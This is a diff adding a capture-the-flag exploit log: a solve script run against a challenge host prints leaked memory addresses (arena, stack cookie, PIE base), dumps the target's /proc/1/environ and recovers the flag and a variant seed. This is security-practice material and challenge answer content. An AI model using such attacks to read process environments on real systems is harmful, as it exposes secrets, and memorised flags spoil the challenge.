@@ -1,0 +1,11 @@
+$ python3 -u solve.py dead-reckoning-4737af39fa0a.chals.z0d1ak.org 1337
+[+] arena=0x5502a23000 cookie=0x8a683a658ae625d7 pie=0x5500000000
+
+=== /proc/1/environ len 256 ===
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HOSTNAME=app-677c4cc98-2xfl2
+FLAG=zdk{ThE_70P_8YTe_CHARtEd_A_RoU7e_B31OW_th3_suRFACe}
+RCTF_VARIANT_SEED=Jy3gRL3t8AS06ciLwKMY58CEbguaPeyATjHB_KS_ak8
+KUBERNETES_PORT_443_TCP_PROTO=tcp
+KUBERNET
+FOUND zdk{ThE_70P_8YTe_CHARtEd_A_RoU7e_B31OW_th3_suRFACe}
